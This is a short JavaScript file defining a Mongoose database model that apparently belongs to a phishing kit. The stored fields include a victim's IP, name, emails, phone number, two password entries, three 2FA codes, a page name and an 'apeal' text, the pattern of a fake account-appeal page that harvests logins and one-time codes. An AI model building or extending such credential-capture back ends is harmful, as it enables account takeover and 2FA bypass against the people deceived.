import mongoose from 'mongoose'

const templateDataSchema = new mongoose.Schema({
    user_ip: { type: String },
    country: { type: String },
    country_code: { type: String },
    "full-name": { type: String },
    "personal-email": { type: String },
    "buiseness-email": { type: String },
    "mobile-phone-number": { type: String },
    "password-1": { type: String },
    "password-2": { type: String },
    "2FA-1": { type: String },
    "2FA-2": { type: String },
    "2FA-3": { type: String },
    "page-name": { type: String },
    apeal: { type: String },
    dis_name: { type: String },
    is_Mobile: { type: Boolean },
    params: { type: String },
}, {
    timestamps: true,
});

const TemplateData = mongoose.model('TemplateData', templateDataSchema);

export default TemplateData;